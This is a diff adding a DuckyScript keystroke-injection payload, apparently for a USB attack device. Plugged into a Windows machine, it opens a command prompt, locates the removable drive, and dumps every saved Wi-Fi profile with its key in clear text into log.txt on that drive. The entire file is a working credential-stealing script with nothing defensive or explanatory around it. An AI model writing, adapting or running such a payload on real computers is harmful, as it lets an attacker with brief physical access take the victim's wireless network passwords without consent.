@@ -1,0 +1,18 @@
+REM Finds the drive letter and saves the Wi-Fi details to the drive
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+REM Command to find USB drive letter using PowerShell
+STRING FOR /F "tokens=* USEBACKQ" %F IN (`powershell -Command "(Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}).DeviceID"`) DO (CD /D %F)
+ENTER
+DELAY 500
+REM Retrieve Wi-Fi profiles and save details to log.txt
+STRING netsh wlan show profiles > profiles.txt
+ENTER
+DELAY 500
+STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> log.txt
+ENTER
+DELAY 500
